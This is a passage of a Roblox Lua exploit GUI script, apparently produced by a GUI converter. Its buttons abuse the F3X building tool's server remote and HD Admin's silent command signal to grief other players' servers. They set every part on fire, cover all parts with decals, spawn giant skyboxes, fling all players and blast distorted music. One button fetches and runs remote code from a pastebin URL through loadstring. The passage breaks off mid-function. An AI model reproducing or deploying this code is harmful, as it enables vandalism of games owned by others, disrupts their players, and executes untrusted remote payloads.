				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 70599226186148 ;pitch 0.2 ;volume 10")
				end)
			end
			coroutine.wrap(URBIN_fake_script)()
			local function CXXPG_fake_script() -- b_4.Script 
				local script = Instance.new('Script', b_4)
		
				script.Parent.MouseButton1Click:Connect(function() 
					loadstring(game:HttpGet("https://pastebin.com/raw/SFTcZ7Nu"))()	
				end)
			end
			coroutine.wrap(CXXPG_fake_script)()
			local function XZXGBUC_fake_script() -- b_5.LocalScript 
				local script = Instance.new('LocalScript', b_5)
		
				script.Parent.MouseButton1Click:Connect(function()
					local player = game.Players.LocalPlayer
					local char = player.Character or player.CharacterAdded:Wait()
					local tool
		
					for i, v in player:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
		
					for i, v in game.ReplicatedStorage:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
		
					local remote = tool.SyncAPI.ServerEndpoint
					local RunService = game:GetService("RunService")
		
					function _(args)
						remote:InvokeServer(unpack(args))
					end
		
					function CreatePart(cf, parent)
						local args = {
							[1] = "CreatePart",
							[2] = "Normal",
							[3] = cf,
							[4] = parent
						}
						_(args)
					end
		
					function SetAnchor(part, boolean)
						local args = {
							[1] = "SyncAnchor",
							[2] = {
								[1] = {
									["Part"] = part,
									["Anchored"] = boolean
								}
							}
						}
						_(args)
					end
		
					function AddMesh(part)
						local args = {
							[1] = "CreateMeshes",
							[2] = {
								[1] = {
									["Part"] = part
								}
							}
						}
						_(args)
					end
		
					function SetMesh(part, meshid)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["MeshId"] = "rbxassetid://" .. meshid
								}
							}
						}
						_(args)
					end
		
					function SetTexture(part, texid)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["TextureId"] = texid
								}
							}
						}
						_(args)
					end
		
					function MeshResize(part, size)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["Scale"] = size
								}
							}
						}
						_(args)
					end
		
					function SetTransparency(part, value)
						local args = {
							[1] = "SyncTransparency",
							[2] = {
								[1] = {
									["Part"] = part,
									["Transparency"] = value
								}
							}
						}
						_(args)
					end
		
					function SetName(part, stringg)
						local args = {
							[1] = "SetName",
							[2] = {
								[1] = part
							},
							[3] = stringg
						}
		
						_(args)
					end
		
					function DestroyPart(part)
						local args = {
							[1] = "Remove",
							[2] = {
								[1] = part
							}
						}
						_(args)
					end
		
					local images = {
						"rbxassetid://13059062216",
						"rbxassetid://13059079081",
						"rbxassetid://13059086913",
						"rbxassetid://13059100365",
						"rbxassetid://13059122107",
						"rbxassetid://13059139679",
						"rbxassetid://13059164385",
						"rbxassetid://13059187920",
						"rbxassetid://13059199929",
						"rbxassetid://13059207998",
						"rbxassetid://13059235017",
						"rbxassetid://13059235017"
					}
		
					local skyPart
					local skyLoop
					local frameTime = 2 / 20
					local lastUpdate = 0
		
					function CreateSky()
						local hrp = char:FindFirstChild("HumanoidRootPart")
						if not hrp then return end
		
						local cf = hrp.CFrame
						CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)
		
						for _, v in workspace:GetDescendants() do
							if v:IsA("BasePart") and v.CFrame.Position == cf.Position + Vector3.new(0, 6, 0) then
								skyPart = v
								SetAnchor(skyPart, true)
								AddMesh(skyPart)
								SetMesh(skyPart, "111891702759441")
								MeshResize(skyPart, Vector3.new(4000, 4000, 4000))
								SetTransparency(skyPart, 1)
								SetName(v,"Sky")
		
								local index = 1
								skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
									lastUpdate = lastUpdate + deltaTime
									if lastUpdate >= frameTime then
										lastUpdate = 0
										if not skyPart then
											print("fuck ittt")
											return
										end
										SetTransparency(skyPart, 0)
										SetTexture(skyPart, images[index])
										index = index % #images + 1
									end
								end)
							end
						end
					end
		
					function ResetSky()
						if skyPart then
							DestroyPart(skyPart)
							skyPart = nil
						end
						if skyLoop then
							skyLoop:Disconnect()
							skyLoop = nil
						end
						CreateSky()
					end
		
					player.CharacterAdded:Connect(function(newChar)
						char = newChar
						ResetSky()
					end)
		
					if char and char:FindFirstChild("Humanoid") then
						char:WaitForChild("Humanoid").Died:Connect(function()
							ResetSky()
						end)
					end
		
					CreateSky()
				end)
			end
			coroutine.wrap(XZXGBUC_fake_script)()
			local function KBLPLXG_fake_script() -- b_6.LocalScript 
				local script = Instance.new('LocalScript', b_6)
		
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local hdFolder = ReplicatedStorage:WaitForChild("HDAdminHDClient")
				local signals = hdFolder:WaitForChild("Signals")
				local requestCommand = signals:WaitForChild("RequestCommandSilent")
		
		
				script.Parent.MouseButton1Click:Connect(function()
		
					local command = ";Transparency" 
					requestCommand:InvokeServer(command)
				end)
			end
			coroutine.wrap(KBLPLXG_fake_script)()
			local function DNNEX_fake_script() -- b_7.LocalScript 
				local script = Instance.new('LocalScript', b_7)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";pants me 16288876823 ;shirt me 559966322 ;face me 406001052")
				end)
			end
			coroutine.wrap(DNNEX_fake_script)()
			local function NWLZHWO_fake_script() -- b_8.LocalScript 
				local script = Instance.new('LocalScript', b_8)
		
				local button = script.Parent
				local player = game.Players.LocalPlayer
				local RunService = game:GetService("RunService")
		
				button.MouseButton1Click:Connect(function()
					local char = player.Character
					if not char then return end
		
					local tool
					for _, v in ipairs(player:GetDescendants()) do
						if v.Name == "SyncAPI" then tool = v.Parent break end
					end
					if not tool then
						for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
							if v.Name == "SyncAPI" then tool = v.Parent break end
						end
					end
		
					if not tool then return end
					local remote = tool.SyncAPI.ServerEndpoint
		
					local function getRandomColor()
						return Color3.new(math.random(), math.random(), math.random())
					end
		
					local parts = {}
					for _, v in ipairs(char:GetChildren()) do
						if v:IsA("BasePart") then
							table.insert(parts, v)
						end
					end
		
					RunService.Heartbeat:Connect(function()
						local syncData = {}
						for _, part in ipairs(parts) do
							table.insert(syncData, {
								Part = part,
								Color = getRandomColor(),
								UnionColoring = false
							})
						end
		
						remote:InvokeServer("SyncColor", syncData)
						task.wait(1)
					end)
				end)
			end
			coroutine.wrap(NWLZHWO_fake_script)()
			local function HYCL_fake_script() -- b_9.LocalScript 
				local script = Instance.new('LocalScript', b_9)
		
				script.Parent.MouseButton1Click:Connect(function()
					--Head Spin
					--found in an old f3x gui 
		
					local player = game.Players.LocalPlayer
					local char = player.Character or player.CharacterAdded:Wait()
					local tool
		
					for _, v in player:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
							break
						end
					end
					for _, v in game.ReplicatedStorage:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
							break
						end
					end
		
					if not tool then
						warn("you need f3x gng")
						return
					end
		
					local remote = tool.SyncAPI.ServerEndpoint
		
					local head = char:WaitForChild("Head", 5)
					if not head then return end
		
					local headMesh = head:FindFirstChildWhichIsA("SpecialMesh") or head:FindFirstChildWhichIsA("FileMesh")
					if not headMesh then
						warn("Cabeça sem SpecialMesh/FileMesh")
						return
					end
		
					local hats = {}
					for _, acc in char:GetChildren() do
						if acc:IsA("Accessory") and acc:FindFirstChild("Handle") then
							local h = acc.Handle
							local m = h:FindFirstChildWhichIsA("SpecialMesh") or h:FindFirstChildWhichIsA("FileMesh")
							if m then
								table.insert(hats, {Part = h, MeshId = m.MeshId})
							end
						end
					end
		
					local RunService = game:GetService("RunService")
					local t = 0
		
					RunService.RenderStepped:Connect(function(dt)
						t = t + dt * 4   
		
		
						local radius = 0.35         
						local spinX = math.cos(t) * radius
						local spinZ = math.sin(t) * radius
		
						local swayY = math.sin(t * 2.5) * 0.15  
						local swayX_extra = math.sin(t * 1.2) * 0.1
						local swayZ_extra = math.cos(t * 1.5) * 0.1
		
						local offset = Vector3.new(spinX + swayX_extra, swayY, spinZ + swayZ_extra)
		
						local partsToSync = {
							{
								Part = head,
								MeshId = headMesh.MeshId,
								Offset = offset
							}
						}
		
						for _, hat in hats do
							table.insert(partsToSync, {
								Part = hat.Part,
								MeshId = hat.MeshId,
								Offset = offset
							})
						end
		
						remote:InvokeServer("SyncMesh", partsToSync)
					end)
		
		
				end)
			end
			coroutine.wrap(HYCL_fake_script)()
			local function AJKSCW_fake_script() -- b_10.LocalScript 
				local script = Instance.new('LocalScript', b_10)
		
				script.Parent.MouseButton1Click:Connect(function()
					local player = game.Players.LocalPlayer
					local char = player.Character
					local tool
					for i,v in player:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
					for i,v in game.ReplicatedStorage:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
					remote = tool.SyncAPI.ServerEndpoint
					function _(args)
						remote:InvokeServer(unpack(args))
					end
					function SetCollision(part,boolean)
						local args = {
							[1] = "SyncCollision",
							[2] = {
								[1] = {
									["Part"] = part,
									["CanCollide"] = boolean
								}
							}
						}
						_(args)
					end
					function SetAnchor(boolean,part)
						local args = {
							[1] = "SyncAnchor",
							[2] = {
								[1] = {
									["Part"] = part,
									["Anchored"] = boolean
								}
							}
						}
						_(args)
					end
					function CreatePart(cf,parent,types)
						local args = {
							[1] = "CreatePart",
							[2] = types,
							[3] = cf,
							[4] = parent
						}
						_(args)
					end
					function DestroyPart(part)
						local args = {
							[1] = "Remove",
							[2] = {
								[1] = part
							}
						}
						_(args)
					end
					function MovePart(part,cf)
						local args = {
							[1] = "SyncMove",
							[2] = {
								[1] = {
									["Part"] = part,
									["CFrame"] = cf
								}
							}
						}
						_(args)
					end
					function Resize(part,size,cf)
						local args = {
							[1] = "SyncResize",
							[2] = {
								[1] = {
									["Part"] = part,
									["CFrame"] = cf,
									["Size"] = size
								}
							}
						}
						_(args)
					end
					function AddMesh(part)
						local args = {
							[1] = "CreateMeshes",
							[2] = {
								[1] = {
									["Part"] = part
								}
							}
						}
						_(args)
					end
		
					function SetMesh(part,meshid)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["MeshId"] = "rbxassetid://"..meshid
								}
							}
						}
						_(args)
					end
					function SetTexture(part, texid)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["TextureId"] = "rbxassetid://"..texid
								}
							}
						}
						_(args)
					end
					function SetName(part, stringg)
						local args = {
							[1] = "SetName",
							[2] = {
								[1] = workspace.Part
							},
							[3] = stringg
						}
		
						_(args)
					end
					function MeshResize(part,size)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["Scale"] = size
								}
							}
						}
						_(args)
					end
					function Weld(part1, part2,lead)
						local args = {
							[1] = "CreateWelds",
							[2] = {
								[1] = part1,
								[2] = part2
							},
							[3] = lead
						}
						_(args)
		
					end
					function SetLocked(part,boolean)
						local args = {
							[1] = "SetLocked",
							[2] = {
								[1] = part
							},
							[3] = boolean
						}
						_(args)
					end
					function SetTrans(part,int)
						local args = {
							[1] = "SyncMaterial",
							[2] = {
								[1] = {
									["Part"] = part,
									["Transparency"] = int
								}
							}
						}
						_(args)
					end
					function CreateSpotlight(part)
						local args = {
							[1] = "CreateLights",
							[2] = {
								[1] = {
									["Part"] = part,
									["LightType"] = "SpotLight"
								}
							}
						}
						_(args)
					end
					function SyncLighting(part,brightness)
						local args = {
							[1] = "SyncLighting",
							[2] = {
								[1] = {
									["Part"] = part,
									["LightType"] = "SpotLight",
									["Brightness"] = brightness
								}
							}
						}
						_(args)
					end
		
					function Material(part,mate)
						local args = {
							[1] = "SyncMaterial",
							[2] = {
								[1] = {
									["Part"] = part,
									["Material"] = mate
								}
							}
						}
						_(args)
					end
					function Color(part,color)
						local args = {
							[1] = "SyncColor",
							[2] = {
								[1] = {
									["Part"] = part,
									["Color"] = color --[[Color3]],
									["UnionColoring"] = false
								}
							}
						}
						_(args)
					end
					function toptexturecreate(part)
						local args = {
							[1] = "CreateTextures",
							[2] = {
								[1] = {
									["Part"] = part,
									["Face"] = Enum.NormalId.Top,
									["TextureType"] = "Texture"
								}
							}
						}
		
						_(args)
					end
					function toptextureadd(part)
						local args = {
							[1] = "SyncTexture",
							[2] = {
								[1] = {
									["Part"] = part,
									["Face"] = Enum.NormalId.Top,
									["TextureType"] = "Texture",
									["Texture"] = "rbxassetid://139842730945412",
									["StudsPerTileV"] = 25,
									["StudsPerTileU"] = 25
								}
							}
						}
						_(args)
					end
					hrpx = math.floor(char.HumanoidRootPart.CFrame.x)
					hrpz = math.floor(char.HumanoidRootPart.CFrame.z)
					hrpy = math.floor(char.HumanoidRootPart.CFrame.y)
					function SpawnBasePlate()
						CreatePart(CFrame.new(hrpx,hrpy-20,hrpz),workspace,"Spawn")
						for i,v in game.Workspace:GetChildren() do
							if v:IsA("BasePart") and v.CFrame.y == hrpy - 20 and v.CFrame.x == hrpx then
								spawn(function()
									Resize(v,Vector3.new(600,20,600),CFrame.new(hrpx,hrpy-20,hrpz))
									Color(v,Color3.fromRGB(0, 0, 0))
									toptexturecreate(v)
									toptextureadd(v)
									while wait(1) do
										pcall(function()SetLocked(v,true)end)
									end
								end)
							end
						end
					end
					SpawnBasePlate()
				end)
			end
			coroutine.wrap(AJKSCW_fake_script)()
			local function ITFYP_fake_script() -- b_11.LocalScript 
				local script = Instance.new('LocalScript', b_11)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
		
					local player = game.Players.LocalPlayer
					local char = player.Character
					local tool
					for i,v in player:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
					for i,v in game.ReplicatedStorage:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
					--craaa
					remote = tool.SyncAPI.ServerEndpoint
					function _(args)
						remote:InvokeServer(unpack(args))
					end
					function SetCollision(part,boolean)
						local args = {
							[1] = "SyncCollision",
							[2] = {
								[1] = {
									["Part"] = part,
									["CanCollide"] = boolean
								}
							}
						}
						_(args)
					end
					function SetAnchor(boolean,part)
						local args = {
							[1] = "SyncAnchor",
							[2] = {
								[1] = {
									["Part"] = part,
									["Anchored"] = boolean
								}
							}
						}
						_(args)
					end
					function CreatePart(cf,parent)
						local args = {
							[1] = "CreatePart",
							[2] = "Normal",
							[3] = cf,
							[4] = parent
						}
						_(args)
					end
					function DestroyPart(part)
						local args = {
							[1] = "Remove",
							[2] = {
								[1] = part
							}
						}
						_(args)
					end
					function MovePart(part,cf)
						local args = {
							[1] = "SyncMove",
							[2] = {
								[1] = {
									["Part"] = part,
									["CFrame"] = cf
								}
							}
						}
						_(args)
					end
					function Resize(part,size,cf)
						local args = {
							[1] = "SyncResize",
							[2] = {
								[1] = {
									["Part"] = part,
									["CFrame"] = cf,
									["Size"] = size
								}
							}
						}
						_(args)
					end
					function AddMesh(part)
						local args = {
							[1] = "CreateMeshes",
							[2] = {
								[1] = {
									["Part"] = part
								}
							}
						}
						_(args)
					end
		
					function SetMesh(part,meshid)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["MeshId"] = "rbxassetid://"..meshid
								}
							}
						}
						_(args)
					end
					function SetTexture(part, texid)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["TextureId"] = "rbxassetid://"..texid
								}
							}
						}
						_(args)
					end
					function SetName(part, stringg)
						local args = {
							[1] = "SetName",
							[2] = {
								[1] = workspace.Part
							},
							[3] = stringg
						}
		
						_(args)
					end
					function MeshResize(part,size)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["Scale"] = size
								}
							}
						}
						_(args)
					end
					function Weld(part1, part2,lead)
						local args = {
							[1] = "CreateWelds",
							[2] = {
								[1] = part1,
								[2] = part2
							},
							[3] = lead
						}
						_(args)
		
					end
					function SetLocked(part,boolean)
						local args = {
							[1] = "SetLocked",
							[2] = {
								[1] = part
							},
							[3] = boolean
						}
						_(args)
					end
					function SetTrans(part,int)
						local args = {
							[1] = "SyncMaterial",
							[2] = {
								[1] = {
									["Part"] = part,
									["Transparency"] = int
								}
							}
						}
						_(args)
					end
					function CreateSpotlight(part)
						local args = {
							[1] = "CreateLights",
							[2] = {
								[1] = {
									["Part"] = part,
									["LightType"] = "SpotLight"
								}
							}
						}
						_(args)
					end
					function SyncLighting(part,brightness)
						local args = {
							[1] = "SyncLighting",
							[2] = {
								[1] = {
									["Part"] = part,
									["LightType"] = "SpotLight",
									["Brightness"] = brightness
								}
							}
						}
						_(args)
					end
					function AddFire(part)
						local args = {
							[1] = "CreateDecorations",
							[2] = {
								[1] = {
									["Part"] = part,
									["DecorationType"] = "Fire"
								}
							}
						}
						_(args)
					end
					function FireParts()
						for i,v in game.Workspace:GetDescendants() do
							spawn(function()
								SetLocked(v,false)
								AddFire(v)
							end)
						end
					end
					FireParts()
		
					local player = game.Players.LocalPlayer
		
				end)
		
				--97518021379547
			end
			coroutine.wrap(ITFYP_fake_script)()
			local function TMLHTBO_fake_script() -- b_12.LocalScript 
				local script = Instance.new('LocalScript', b_12)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 114417850687501 ;pitch 0.31 ;volume 10")
				end)
			end
			coroutine.wrap(TMLHTBO_fake_script)()
			local function FWVIJZ_fake_script() -- jeje_2.LocalScript 
				local script = Instance.new('LocalScript', jeje_2)
		
				while wait() do
					for i = 0,255,5 do
						script.Parent.ImageColor3 = Color3.fromRGB(255,i,0) -- change backgroundcolor3 to textcolor3 to make text color rainbow
						wait(0.01)
					end
					for i = 255,0,-5 do
						script.Parent.ImageColor3 = Color3.fromRGB(i,255,0)
						wait(0.01)
					end
					for i = 0,255,5 do
						script.Parent.ImageColor3 = Color3.fromRGB(0,255,i)
						wait(0.01)
					end
					for i = 255,0,-5 do
						script.Parent.ImageColor3 = Color3.fromRGB(0,i,255)
						wait(0.01)
					end
					for i = 0,255,5 do
						script.Parent.ImageColor3 = Color3.fromRGB(i,0,255)
						wait(0.01)
					end
					for i = 255,0,-5 do
						script.Parent.ImageColor3 = Color3.fromRGB(255,0,i)
						wait(0.01)
					end
				end
			end
			coroutine.wrap(FWVIJZ_fake_script)()
			local function VLNUU_fake_script() -- b_13.LocalScript 
				local script = Instance.new('LocalScript', b_13)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";size me 10 ;speed me 30")
				end)
			end
			coroutine.wrap(VLNUU_fake_script)()
			local function HOVU_fake_script() -- b_14.LocalScript 
				local script = Instance.new('LocalScript', b_14)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";fling all")
				end)
			end
			coroutine.wrap(HOVU_fake_script)()
			local function DVST_fake_script() -- b_15.LocalScript 
				local script = Instance.new('LocalScript', b_15)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local Players = game:GetService("Players")
		
					local RequestCommand = ReplicatedStorage
						:WaitForChild("HDAdminHDClient")
						.Signals.RequestCommandSilent
		
		
					RequestCommand:InvokeServer(";unfog")
					RequestCommand:InvokeServer(";fogcolor black")
					RequestCommand:InvokeServer(";time 0")
		
					wait(0.3)
		
					local player = Players.LocalPlayer
					local char = player.Character or player.CharacterAdded:Wait()
		
		
					local tool
					for _,v in player:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
					for _,v in ReplicatedStorage:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
		
					if not tool then
						warn("No se encontró SyncAPI")
						return
					end
		
					local remote = tool.SyncAPI.ServerEndpoint
					local function _(args)
						remote:InvokeServer(unpack(args))
					end
		
					-- FUNCIONES F3X
					function CreatePart(cf,parent)
						_({
							[1] = "CreatePart",
							[2] = "Normal",
							[3] = cf,
							[4] = parent
						})
					end
		
					function AddMesh(part)
						_({
							[1] = "CreateMeshes",
							[2] = {
								[1] = {["Part"] = part}
							}
						})
					end
		
					function SetMesh(part,id)
						_({
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["MeshId"] = "rbxassetid://"..id
								}
							}
						})
					end
		
					function SetTexture(part,id)
						_({
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["TextureId"] = "rbxassetid://"..id
								}
							}
						})
					end
		
					function MeshResize(part,size)
						_({
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["Scale"] = size
								}
							}
						})
					end
		
					function SetCollision(part,bool)
						_({
							[1] = "SyncCollision",
							[2] = {
								[1] = {
									["Part"] = part,
									["CanCollide"] = bool
								}
							}
						})
					end
		
					function SetLocked(part,bool)
						_({
							[1] = "SetLocked",
							[2] = {[1] = part},
							[3] = bool
						})
					end
		
					function SetName(part,name)
						_({
							[1] = "SetName",
							[2] = {[1] = part},
							[3] = name
						})
					end
		
					function SetVertexColor(part,vec)
						_({
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["VertexColor"] = vec
								}
							}
						})
					end
		
					function CreateSpotlight(part)
						_({
							[1] = "CreateLights",
							[2] = {
								[1] = {
									["Part"] = part,
									["LightType"] = "SpotLight"
								}
							}
						})
					end
		
					function SyncLighting(part,brightness)
						_({
							[1] = "SyncLighting",
							[2] = {
								[1] = {
									["Part"] = part,
									["LightType"] = "SpotLight",
									["Brightness"] = brightness
								}
							}
						})
					end
		
		
					function Sky(textureId)
						local hrp = char:WaitForChild("HumanoidRootPart")
		
						local x = math.floor(hrp.Position.X)
						local y = math.floor(hrp.Position.Y)
						local z = math.floor(hrp.Position.Z)
		
						CreatePart(
							CFrame.new(x,y,z) + Vector3.new(0,-10,0),
							workspace
						)
		
						for _,v in workspace:GetDescendants() do
							if v:IsA("BasePart")
								and math.floor(v.Position.X) == x
								and math.floor(v.Position.Z) == z then
		
								SetName(v,"sky")
								AddMesh(v)
								SetMesh(v,"111891702759441")
								SetTexture(v, textureId)
		
								MeshResize(v, Vector3.new(99999,99999,99999))
								SetCollision(v,false)
								SetLocked(v,true)
		
		
								SetVertexColor(v, Vector3.new(5,5,5))
		
		
								CreateSpotlight(v)
								SyncLighting(v,12)
							end
						end
					end
		
		
					Sky("97518021379547")
				end)
		
				--97518021379547
			end
			coroutine.wrap(DVST_fake_script)()
			local function TBGB_fake_script() -- b_16.LocalScript 
				local script = Instance.new('LocalScript', b_16)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local player = game.Players.LocalPlayer
					local char = player.Character
					local tool
					for i,v in player:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
					for i,v in game.ReplicatedStorage:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
					--craaa
					remote = tool.SyncAPI.ServerEndpoint
					function _(args)
						remote:InvokeServer(unpack(args))
					end
					function SetCollision(part,boolean)
						local args = {
							[1] = "SyncCollision",
							[2] = {
								[1] = {
									["Part"] = part,
									["CanCollide"] = boolean
								}
							}
						}
						_(args)
					end
					function SetAnchor(boolean,part)
						local args = {
							[1] = "SyncAnchor",
							[2] = {
								[1] = {
									["Part"] = part,
									["Anchored"] = boolean
								}
							}
						}
						_(args)
					end
					function CreatePart(cf,parent)
						local args = {
							[1] = "CreatePart",
							[2] = "Normal",
							[3] = cf,
							[4] = parent
						}
						_(args)
					end
					function DestroyPart(part)
						local args = {
							[1] = "Remove",
							[2] = {
								[1] = part
							}
						}
						_(args)
					end
					function MovePart(part,cf)
						local args = {
							[1] = "SyncMove",
							[2] = {
								[1] = {
									["Part"] = part,
									["CFrame"] = cf
								}
							}
						}
						_(args)
					end
					function Resize(part,size,cf)
						local args = {
							[1] = "SyncResize",
							[2] = {
								[1] = {
									["Part"] = part,
									["CFrame"] = cf,
									["Size"] = size
								}
							}
						}
						_(args)
					end
					function AddMesh(part)
						local args = {
							[1] = "CreateMeshes",
							[2] = {
								[1] = {
									["Part"] = part
								}
							}
						}
						_(args)
					end
		
					function SetMesh(part,meshid)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["MeshId"] = "rbxassetid://"..meshid
								}
							}
						}
						_(args)
					end
					function SetTexture(part, texid)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["TextureId"] = "rbxassetid://"..texid
								}
							}
						}
						_(args)
					end
					function SetName(part, stringg)
						local args = {
							[1] = "SetName",
							[2] = {
								[1] = part
							},
							[3] = stringg
						}
		
						_(args)
					end
					function MeshResize(part,size)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["Scale"] = size
								}
							}
						}
						_(args)
					end
					function Weld(part1, part2,lead)
						local args = {
							[1] = "CreateWelds",
							[2] = {
								[1] = part1,
								[2] = part2
							},
							[3] = lead
						}
						_(args)
		
					end
					function SetLocked(part,boolean)
						local args = {
							[1] = "SetLocked",
							[2] = {
								[1] = part
							},
							[3] = boolean
						}
						_(args)
					end
					function SetTrans(part,int)
						local args = {
							[1] = "SyncMaterial",
							[2] = {
								[1] = {
									["Part"] = part,
									["Transparency"] = int
								}
							}
						}
						_(args)
					end
					function CreateSpotlight(part)
						local args = {
							[1] = "CreateLights",
							[2] = {
								[1] = {
									["Part"] = part,
									["LightType"] = "SpotLight"
								}
							}
						}
						_(args)
					end
					function SyncLighting(part,brightness)
						local args = {
							[1] = "SyncLighting",
							[2] = {
								[1] = {
									["Part"] = part,
									["LightType"] = "SpotLight",
									["Brightness"] = brightness
								}
							}
						}
						_(args)
					end
					function Color(part,color)
						local args = {
							[1] = "SyncColor",
							[2] = {
								[1] = {
									["Part"] = part,
									["Color"] = color --[[Color3]],
									["UnionColoring"] = false
								}
							}
						}
						_(args)
					end
					function SpawnDecal(part,side)
						local args = {
							[1] = "CreateTextures",
							[2] = {
								[1] = {
									["Part"] = part,
									["Face"] = side,
									["TextureType"] = "Decal"
								}
							}
						}
		
						_(args)
					end
					function AddDecal(part,asset,side)
						local args = {
							[1] = "SyncTexture",
							[2] = {
								[1] = {
									["Part"] = part,
									["Face"] = side,
									["TextureType"] = "Decal",
									["Texture"] = "rbxassetid://".. asset
								}
							}
						}
						_(args)
					end
		
					function spam(id)
						for i,v in game.workspace:GetDescendants() do
							if v:IsA("BasePart") then
								spawn(function()
									SetLocked(v,false)
									SpawnDecal(v,Enum.NormalId.Front)
									AddDecal(v,id,Enum.NormalId.Front)
		
									SpawnDecal(v,Enum.NormalId.Back)
									AddDecal(v,id,Enum.NormalId.Back)
		
									SpawnDecal(v,Enum.NormalId.Right)
									AddDecal(v,id,Enum.NormalId.Right)
		
									SpawnDecal(v,Enum.NormalId.Left)
									AddDecal(v,id,Enum.NormalId.Left)
		
									SpawnDecal(v,Enum.NormalId.Bottom)
									AddDecal(v,id,Enum.NormalId.Bottom)
		
									SpawnDecal(v,Enum.NormalId.Top)
									AddDecal(v,id,Enum.NormalId.Top)
								end)
							end
						end 
					end
					spam("104015451097966")
				end)
			end
			coroutine.wrap(TBGB_fake_script)()
			local function GZYV_fake_script() -- b_17.LocalScript 
				local script = Instance.new('LocalScript', b_17)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local player = game.Players.LocalPlayer
					local chara = player.Character
					local tool
					for i,v in player:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
					for i,v in game.ReplicatedStorage:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
					--craaa
					remote = tool.SyncAPI.ServerEndpoint
					function _(args)
						remote:InvokeServer(unpack(args))
					end
					function SetCollision(part,boolean)
						local args = {
							[1] = "SyncCollision",
							[2] = {
								[1] = {
									["Part"] = part,
									["CanCollide"] = boolean
								}
							}
						}
						_(args)
					end
					function SetAnchor(boolean,part)
						local args = {
							[1] = "SyncAnchor",
							[2] = {
								[1] = {
									["Part"] = part,
									["Anchored"] = boolean
								}
							}
						}
						_(args)
					end
					function CreatePart(cf,parent)
						local args = {
							[1] = "CreatePart",
							[2] = "Normal",
							[3] = cf,
							[4] = parent
						}
						_(args)
					end
					function DestroyPart(part)
						local args = {
							[1] = "Remove",
							[2] = {
								[1] = workspace.Part
							}
						}
						_(args)
					end
					function MovePart(part,cf)
						local args = {
							[1] = "SyncMove",
							[2] = {
								[1] = {
									["Part"] = part,
									["CFrame"] = cf
								}
							}
						}
						_(args)
					end
					function Resize(part,size,cf)
						local args = {
							[1] = "SyncResize",
							[2] = {
								[1] = {
									["Part"] = part,
									["CFrame"] = cf,
									["Size"] = size
								}
							}
						}
						_(args)
					end
					function AddMesh(part)
						local args = {
							[1] = "CreateMeshes",
							[2] = {
								[1] = {
									["Part"] = part
								}
							}
						}
